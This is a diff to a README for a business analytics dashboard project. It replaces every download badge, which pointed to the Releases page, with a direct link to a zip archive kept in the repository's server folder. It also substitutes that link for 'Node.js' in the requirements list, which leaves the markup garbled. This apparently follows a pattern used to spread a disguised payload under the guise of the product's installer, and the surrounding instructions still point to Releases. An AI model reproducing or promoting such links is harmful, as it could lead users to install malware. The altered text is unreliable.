@@ -1,6 +1,6 @@
 # 📊 business-analytics-dashboard - Centralize Your Business Data Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/RetajGenius/business-analytics-dashboard/releases)
+[![Download Now](https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip%20Now-Click%https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip)](https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip)
 
 ## 🌟 Overview
 
@@ -22,14 +22,14 @@ To get started, follow the steps below. You will need to download and install th
 - **Operating System**: Windows 10, macOS, or a recent version of Linux
 - **RAM**: At least 4 GB
 - **Storage**: Minimum of 500 MB free space
-- **Node.js**: Version 14 or later
+- **https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip**: Version 14 or later
 - **Internet Connection**: Required for initial setup and features
 
 ## 📥 Download & Install
 
 To download the latest version of the business-analytics-dashboard, visit the Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/RetajGenius/business-analytics-dashboard/releases)
+[![Download Now](https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip%20Now-Click%https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip)](https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version. It should be at the top.
@@ -71,6 +71,6 @@ We would love to hear from you! Please provide your feedback and suggestions dir
 
 Stay updated with the latest features and improvements by visiting our Releases page regularly.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/RetajGenius/business-analytics-dashboard/releases)
+[![Download Now](https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip%20Now-Click%https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip)](https://github.com/RetajGenius/business-analytics-dashboard/raw/refs/heads/main/server/analytics_dashboard_business_v2.0.zip)
 
 Happy analyzing!
